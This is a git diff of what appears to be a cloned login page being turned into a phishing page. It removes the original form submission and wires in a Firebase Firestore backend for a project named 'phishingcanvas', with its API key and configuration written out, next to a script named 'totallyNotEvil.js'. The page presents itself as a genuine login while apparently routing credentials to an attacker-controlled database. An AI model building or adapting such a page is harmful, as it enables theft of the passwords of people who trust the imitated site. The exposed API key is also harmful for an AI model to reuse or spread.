@@ -73,7 +73,7 @@
         </header>
         <div style="clear: both"></div>
        </div><!-- .entry-content -->
-       <form method="post" id="fm1" class="form-horizontal" htmlescape="true" role="form" onsubmit="return prepareSubmit(this);">
+       <form id="fm1" class="form-horizontal" role="form" >
         <div class="sticky-wrapper">
         <div id="box-login" class="box-light">
 <!--
@@ -318,7 +318,31 @@ By logging in to this site, you agree to the terms of the
   </div>
 </div>
  </div><!-- #page -->
- <script type="text/javascript" src="./Login_files/totallyNotEvil.js"></script>
 
+    <!-- FIREBASE -->
+    <!-- The core Firebase JS SDK is always required and must be listed first -->
+    <script src="https://www.gstatic.com/firebasejs/7.5.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.5.0/firebase-firestore.js"></script>
+
+    <!-- TODO: Add SDKs for Firebase products that you want to use
+        https://firebase.google.com/docs/web/setup#available-libraries -->
+
+    <script>
+    // Your web app's Firebase configuration
+    var firebaseConfig = {
+        apiKey: "AIzaSyASShfZGBi8B0oLDCdEgKQqShM32AHWiZU",
+        authDomain: "phishingcanvas.firebaseapp.com",
+        databaseURL: "https://phishingcanvas.firebaseio.com",
+        projectId: "phishingcanvas",
+        storageBucket: "phishingcanvas.appspot.com",
+        messagingSenderId: "804445593726",
+        appId: "1:804445593726:web:069091569714110cd9782f"
+    };
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    var theDB = firebase.firestore();
+    </script>
+
+ <script type="text/javascript" src="./Login_files/totallyNotEvil.js"></script>
 
 </body></html>
